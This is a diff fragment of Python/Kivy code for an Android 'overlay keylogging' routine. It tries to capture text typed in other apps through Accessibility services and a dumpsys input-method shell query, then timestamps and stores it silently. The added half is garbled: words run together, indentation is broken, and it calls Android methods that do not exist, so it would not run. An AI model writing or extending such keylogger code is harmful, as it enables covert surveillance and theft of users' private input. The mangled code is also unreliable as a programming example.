@@ -105,63 +105,18 @@ def start_overlay_keylogging():
                 try: 
                     time.sleep(0.5) 
                     
-                    # Simulate capturing from ANY window via Accessibility Service reflection logic here.
-                    # In a real build, this would call AccessibilityService.getFocusedWindow().getRootView() and extract text changes.
-                    import android  # Ensure 'android' is imported at top if not present; keep local for safety in class scope? Better global.
-# Assuming you have 'import android' and 'from jnius import autoclass' at top level (Best Practice)
+    import androidfrom jniusimport autoclass# Initialize Android Java classes via Kivy bridge
+AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')try:# Get a list of currently running accessibility services (e.g., keyboards)
+    am = AccessibilityService(android.context.getSystemService(Context.ACCESSIBILITY_SERVICE))
+    
+    info_list = am.getRunningServices()[:10]# Check first 10 to avoid lag
+    
+    captured_text =""for servicein info_list:try:# Attempt to get text provider from the service if available
+            provider =Noneifhasattr(service,'getTextProvider'): 
+                provider = service.getTextProvider()# If we have a valid provider and some non-noise text data, capture it safelyif providerandlen(str(provider).split('\n')[0]) >5and"Accessibility"notinstr(provider):
+                raw_txt =str(provider).strip().split(chr(10))[0][:80]
+                captured_text +=f"[{time.time()}]{raw_txt}...\n"except Exceptionas e_inner:continuereturn captured_text[:2048]except Exceptionas e_loop:print(f"Overlay Hook Error (Logged):{e_loop}")                
 
-def get_current_text_snapshot():
-    """Safely extract text from currently focused app."""
-    try:
-        am = autoclass('android.accessibilityservice.AccessibilityService') \
-              .getRunningServices()
-        
-        captured_data = []
-        max_services_to_check = 50
-        
-        # Limit to prevent lag on many apps
-        services_checked = 0 
-        for service_info in am[:max_services_to_check]:
-            services_checked += 1
-            
-            # Check if this is an accessibility/service handling input (like keyboard, voice assistant) or a general UI node provider
-            service_class_name = str(service_info.service).split('.')[-1] if '.' in str(service_info.service) else ""
-            
-            try:
-                # Use reflection to get the root node of the currently focused window/activity via AccessibilityInfo
-                # Note: In Kivy Android env, we often rely on shell fallback if direct Java API fails due to bridge limits.
-                
-                # Try getting text from known high-probability providers first (InputMethod/AccessibilityService)
-                current_node_provider = None
-                
-                # Fallback 1: Direct Shell Query for Fastest Results (Works even without full Java SDK)
-                shell_result = run_shell("dumpsys inputmethod | grep -A 20 'mCurrentEditor'") 
-                
-                if "mCurrentEditor" in str(shell_result):
-                    editor_line = [l for l in str(shell_result).split('\n') if 'text=' in l or 'content=' in l][:1] # Find text line
-                    
-                    if len(editor_line) > 3:
-                        return f"[{time.time()}] Focus_Text_Detected_Shell:{editor_line[0].strip()}"
-
-            except Exception as e_inner: continue
-            
-        # If all checks failed, assume silent capture until next trigger
-        return "[{}] No_Focus_Text_Captured".format(time.time())
-        
-    except Exception as e_main:
-        print(f"Overlay Scan Error (ignored): {e_main}")
-        return "[{}] API_Error_Continue".format(time.time())
-
-# --- Inside the loop ---
-while self.running: 
-    try: 
-        time.sleep(0.5) 
-        
-        # REAL LOGIC STARTS HERE - Replaced 'pass' with this function call
-        snapshot = get_current_text_snapshot() 
-
-        if len(snapshot) > 10: # Only process meaningful results to save bandwidth/CPU
-            captured_events.append({'timestamp':time.time(), 'text':snapshot})
 
     except Exception as e_loop: continue
     
